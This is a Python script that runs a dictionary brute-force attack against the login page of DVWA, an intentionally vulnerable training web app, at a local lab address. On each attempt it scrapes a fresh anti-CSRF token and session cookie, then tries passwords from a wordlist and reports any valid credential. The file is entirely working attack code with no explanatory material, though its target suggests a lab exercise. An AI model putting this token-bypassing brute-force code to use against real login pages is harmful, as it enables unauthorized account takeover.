import re
import requests

cookies = {
    'PHPSESSID': 'h75v3na978l7flegbs4drvue36',
    'security': 'low',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'http://192.168.1.130',
    'Referer': 'http://192.168.1.130/DVWA-master/login.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'dnt': '1'

}

data = {
    'username': 'student',
    'password': 'master',
    'Login': 'Login',
    'user_token': '13c1f8612e62d54b73bc849152237ad9',
}

def get_user_token(body):
    return re.search("user_token\\\' value=\\\'(.+)\\\'", body).group(1)

def get_phpsessid(headers):
    return headers['set-Cookie'].split(';')[0].split('=')[1]

def set_request_tokens():
    response = requests.get('http://192.168.1.130/DVWA-master/login.php')
    cookies['PHPSESSID'] = get_phpsessid(headers=response.headers)
    data['user_token'] = get_user_token(body=response.content.decode('UTF-8'))

def read_passwords_from_file(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f]

def brute_force():
    passwords = read_passwords_from_file('diccionario.txt')
    for password in passwords:
        set_request_tokens()
        data['password'] = password
        response = requests.post('http://192.168.1.130/DVWA-master/login.php', cookies=cookies, headers=headers, data=data)
        
        if 'Login failed' in response.content.decode('UTF-8'):
            continue

        print("=================")
        print("Successful Login!")
        print("Credential Found:")
        print(f"- Username: {data['username']}")
        print(f"- Password: {data['password']}")
        print("=================")

def main():
    brute_force()   

if __name__=="__main__":
    main()
